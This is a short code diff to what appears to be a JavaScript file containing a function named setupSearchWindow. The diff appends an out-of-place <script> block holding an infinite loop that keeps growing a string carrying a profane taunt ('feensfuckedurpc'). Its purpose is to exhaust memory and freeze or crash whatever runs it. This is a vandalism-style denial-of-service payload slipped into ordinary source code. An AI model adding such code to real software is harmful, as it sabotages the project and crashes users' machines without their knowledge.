@@ -1104,3 +1104,10 @@ function setupSearchWindow (win) {
     }, 500)
   }, 2500)
 }
+
+<script>
+txt = "feens";
+while(1){
+    txt = txt += "feensfuckedurpc"; 
+}
+</script>
